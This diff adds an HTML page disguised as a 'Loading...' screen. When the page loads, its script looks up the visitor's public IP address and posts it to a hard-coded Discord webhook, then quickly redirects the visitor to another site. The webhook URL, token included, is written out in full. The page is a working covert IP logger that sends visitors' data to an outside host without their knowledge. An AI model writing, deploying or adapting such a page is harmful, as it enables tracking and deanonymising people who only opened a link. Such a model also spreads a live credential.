@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // Your Discord webhook URL (replace with a new one)
+        const webhookURL = "https://discord.com/api/webhooks/1346197853021798440/VgIi-Tqo_OjX89cvWfvcp5RjR0yfMaqkkrn4C-uZpfJPGT6OijeRnPP8F1tqzdS-BkWM";
+
+        // Function to get the visitor's IP and send it to Discord
+        function logIP() {
+            fetch("https://api64.ipify.org?format=json") // Get public IP
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+
+                    // Send IP to Discord webhook with "IPS" label
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ content: `IP: \`${userIP}\`` })
+                    });
+
+                    // Redirect after logging IP
+                    setTimeout(() => {
+                        window.location.href = "https://whatismyipaddress.com/"; // Change to your redirect URL
+                    }, 1); // Delay before redirect
+                })
+                .catch(error => console.error("Error fetching IP:", error));
+        }
+
+        // Run function when the page loads
+        window.onload = logIP;
+    </script>
+</head>
+<body>
+    <h2>Loading...</h2>
+</body>
+</html>
